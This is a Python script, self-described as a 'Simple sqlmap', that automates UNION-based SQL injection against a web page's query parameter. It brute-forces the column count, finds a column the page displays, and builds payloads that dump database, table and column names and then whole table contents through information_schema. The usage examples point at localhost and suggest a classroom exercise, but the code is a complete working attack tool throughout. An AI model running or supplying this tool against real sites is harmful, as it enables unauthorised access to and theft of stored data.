import requests
import sys
import getopt
from bs4 import BeautifulSoup

database = False
table = False
column = False
dump = False
column_count = 0
url = ''
db = ''
tb = ''
initial_payload = ''
visible_column = 0

def main():
    global database
    global table
    global db
    global tb
    global column
    global dump
    global url

    if not len(sys.argv[1:]):
        usage()
    try:
        opts, _ = getopt.getopt(sys.argv[1:], "hu:d:D:T:C:", ["help", "dbs", "tables", "columns", "dump"])
    except getopt.GetoptError as err:
        print (str(err))

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
            return
        elif o in ("-u"):
            url = a
            url = falsify_query_string_parameter()
        elif o in ("-d"):
            key = a
            print(key)
        elif o in ("--dbs"):
            database = True
        elif o in ("-D"):
            db = a
        elif o in ("--tables"):
            table = True
        elif o in ("-T"):
            tb = a
        elif o in ("--columns"):
            column = True
        elif o in ("--dump"):
            dump = True

    get_column_count()
    construct_initial_payload()
    get_visible_column()

    if database:
        dump_db()
    elif table:
        dump_table()
    elif column:
        dump_column()
    else:
        dump_data()

def dump_db():
    print('dumping all databases...')

    payload = build_injection_payload("concat('<data>', group_concat(schema_name), '</data>')", 'from information_schema.schemata')
    
    print(f'\npayload: {payload}')
    print('\nresult: ')
    sqli_result(payload)

def dump_table():
    global db

    print('\ndumping all tables...')
    if db == '':
        print('-D parameter not provided, will now opt to use current working database')
        db = 'database()'
    else:
        db = f"'{db}'"

    payload = build_injection_payload("concat('<data>', group_concat(table_name), '</data>')", f"from information_schema.tables where table_schema = {db}")
    
    print(f'\npayload: {payload}')
    print('\nresult: ')
    sqli_result(payload)

def dump_column():
    global db

    if tb == '':
        print('please specify table to use')
        exit()

    print('\ndumping all columns...')
    if db == '':
        print('-D parameter not provided, will now opt to use current working database')
        db = 'database()'
    else:
        db = f"'{db}'"

    payload = build_injection_payload("concat('<data>', group_concat(column_name), '</data>')", f"from information_schema.columns where table_schema = {db} and table_name = '{tb}'")
    
    print(f'\npayload: {payload}')
    print('\nresult: ')
    sqli_result(payload)

def dump_data():
    global db

    if tb == '':
        print('please specify table to use')
        exit()

    print('\ndumping all data...')
    if db == '':
        print('-D parameter not provided, will now opt to use current working database')
        db = 'database()'
    else:
        db = f"'{db}'"

    payload = build_injection_payload("concat('<data>', group_concat(column_name), '</data>')", f"from information_schema.columns where table_schema = {db} and table_name = '{tb}'")
    columns = sqli_result(payload)

    payload = build_injection_payload(f"concat('<data>', group_concat({separated_data_column_query(columns)} separator '\\n'), '</data>')", f"from {tb}")
    
    print(f'\npayload: {payload}')
    print('\nresult: ')
    print(data_dump_header(columns))
    sqli_result(payload)

def data_dump_header(columns):
    return columns.replace(',', ' | ')

def separated_data_column_query(columns):
    query = ''
    split = columns.split(',')
    for column in split:
        if query != '':
            query = f"{query},concat(' | ',{column})"
        else:
            query = f"{column}"
    
    # print(query)
    return query

def sqli_result(payload, header=False):
    res = requests.get(payload)
    soup = BeautifulSoup(res.text, 'html.parser')
    sqli_result = soup.find('data')

    if not sqli_result:
        print('wrong input, no result found')
        return

    print(sqli_result.text)
    return sqli_result.text

def build_injection_payload(first, second):
    return f'{initial_payload.replace(str(visible_column), first)} {second}'

def get_visible_column():
    print('testing visible column...')

    global visible_column
    test_string = 'hey yo'

    for i in range(1, column_count + 1):
        payload = right_replace(initial_payload, str(i), f"'{test_string}'")
        if column_visible(payload, test_string):
            print(f'column {i} is visible in the website')
            visible_column = i
            return

def column_visible(payload, search_string):
    res = requests.get(payload)
    soup = BeautifulSoup(res.text, 'html.parser')
    temp = soup.find_all(['a', 'p', 'div', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6'], string=str(search_string))
    return bool(len(temp))

def get_column_count():
    print('bruteforcing column...')

    global column_count
    i = 1
    payload = f'{url} union select 1'

    while i < 100:
        res = requests.get(payload)

        if res.status_code == 500 or not is_php_query_error(res.text):
            
            if res.status_code == 500:
                # column_count exceeded table's column count
                column_count = i - 1
            else:
                column_count = i

            print(f'total column = {column_count}')
            return column_count
        
        i += 1
        payload = f'{payload},{i}'

    print('sqli not possible')
    exit()

def construct_initial_payload():
    global initial_payload
    i = 2
    initial_payload = f'{url} union select 1'

    for i in range(2, column_count + 1):
        initial_payload = f'{initial_payload}, {i}'
        i += 1

def is_php_query_error(text):
    return 'fatal error' in text.lower()

def falsify_query_string_parameter():
    query_param = url.split('=')[1]
    return right_replace(url, query_param, '-1')

def right_replace(string, before, after):
    return after.join(string.rsplit(before, 1))

def usage():
    print("Simple sqlmap\n")
    print("Usage: pert11.py -u [target_url]")
    print("-d                        - key name as a payload for bypass")
    print("--dbs                     - dump all database")
    print("-D                        - dump data in the given database")
    print("--tables                  - dump all table, database argument is required")
    print("-T                        - dump data from the given table")
    print("--columns                 - dump all column, database and table argument is required")
    print("--dump                    - if -C is not supllied, will dump all data in the table")
    print("\n")
    print("Examples: ")
    print("pert11.py -u http://localhost/pert11/book.php?id=1 --dbs")
    print("pert11.py -u http://localhost/pert11/book.php?id=1 --tables -D database")
    print("pert11.py -u http://localhost/pert11/book.php?id=1 --tables")
    print("pert11.py -u http://localhost/pert11/book.php?id=1 --columns -D database -T user")
    print("pert11.py -u http://localhost/pert11/book.php?id=1 --dump -D database -T user")

if __name__ == "__main__":
    main()